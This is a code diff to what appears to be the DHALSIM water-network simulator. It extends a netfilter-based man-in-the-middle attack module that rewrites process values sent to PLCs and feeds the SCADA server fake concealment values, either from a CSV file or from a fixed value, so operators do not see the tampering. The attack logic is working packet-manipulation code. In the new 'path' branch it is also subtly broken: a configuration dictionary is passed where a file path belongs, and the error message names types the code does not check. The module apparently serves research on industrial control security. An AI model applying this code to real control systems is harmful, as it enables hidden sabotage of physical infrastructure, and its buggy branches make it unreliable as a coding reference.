@@ -12,6 +12,11 @@ from scapy.packet import Raw
 
 from dhalsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload
 
+class Error(Exception):
+    """Base class for exceptions in this module."""
+
+class ConcealmentError(Error):
+    """Raised when there is an error in the concealment parameter"""
 
 class ConcealmentMiTMNetfilterQueue(PacketQueue):
 
@@ -20,8 +25,18 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
         self.attacked_tag = self.intermediate_attack['tag']
         self.scada_session_ids = []
         self.attack_session_ids = []
+        self.concealment_type = None
 
-        self.concealment_data_pd = pd.read_csv(self.intermediate_attack['concealment_data'])
+        if 'concealment_data' in self.intermediate_attack.keys():
+            if self.intermediate_attack['concealment_data']['type'] == 'path':
+                self.concealment_type = 'path'
+                self.concealment_data_pd = pd.read_csv(self.intermediate_attack['concealment_data'])
+            elif self.intermediate_attack['concealment_data']['type'] == 'value':
+                self.concealment_type = 'value'
+            else:
+                raise ConcealmentError("Concealment data type is invalid, supported values are 'concealment_value' or 'concealment_path ")
+
+        self.logger.debug('Concealment type is: ' + str(self.concealment_type))
 
     def capture(self, packet):
         """
@@ -35,20 +50,26 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
         try:
             p = IP(packet.get_payload())
             if 'TCP' in p:
-                if len(p) == 116:
-                    this_session =  int.from_bytes(p[Raw].load[4:8], sys.byteorder)
-                    tag_name = p[Raw].load.decode(encoding='latin-1')[54:56]
+                self.logger.debug('TCP packet')
+                if len(p) == 118:
+                    this_session = int.from_bytes(p[Raw].load[4:8], sys.byteorder)
+                    tag_name = p[Raw].load.decode(encoding='latin-1')[54:57]
+                    self.logger.debug('Tag name: ' + str(tag_name))
+                    self.logger.debug('Attack tag: ' + self.attacked_tag)
                     if self.attacked_tag == tag_name:
                         # This is a packet being sent to SCADA server, conceal the manipulation
                         if p[IP].src == self.intermediate_yaml['scada']['public_ip']:
+                            self.logger.debug('SCADA Req session')
                             self.scada_session_ids.append(this_session)
                         else:
+                            self.logger.debug('PLC Req session')
                             self.attack_session_ids.append(this_session)
 
                 if len(p) == 102:
                     this_session = int.from_bytes(p[Raw].load[4:8], sys.byteorder)
+
                     if this_session in self.attack_session_ids:
-                        value = translate_payload_to_float(p[Raw].load)
+                        #value = translate_payload_to_float(p[Raw].load)
 
                         if 'value' in self.intermediate_attack.keys():
                             p[Raw].load = translate_float_to_payload(
@@ -67,10 +88,16 @@ class ConcealmentMiTMNetfilterQueue(PacketQueue):
 
                     elif this_session in self.scada_session_ids:
                         self.logger.debug('Concealing to SCADA: ' + str(this_session))
-                        exp = (self.concealment_data_pd['iteration'] == self.get_master_clock())
-                        concealment_value = float(self.concealment_data_pd.loc[exp][self.attacked_tag].values[-1])
-                        self.logger.debug('Concealing with value: ' + str(concealment_value))
-                        p[Raw].load = translate_float_to_payload(concealment_value, p[Raw].load)
+
+                        if self.concealment_type == 'path':
+                            exp = (self.concealment_data_pd['iteration'] == self.get_master_clock())
+                            concealment_value = float(self.concealment_data_pd.loc[exp][self.attacked_tag].values[-1])
+                            self.logger.debug('Concealing with value: ' + str(concealment_value))
+                            p[Raw].load = translate_float_to_payload(concealment_value, p[Raw].load)
+                        elif self.concealment_type == 'value':
+                            concealment_value = self.intermediate_attack['concealment_data']['concealment_value']
+                            self.logger.debug('Concealment value is: ' + str(concealment_value))
+                            p[Raw].load = translate_float_to_payload(concealment_value, p[Raw].load)
 
                         del p[IP].chksum
                         del p[TCP].chksum
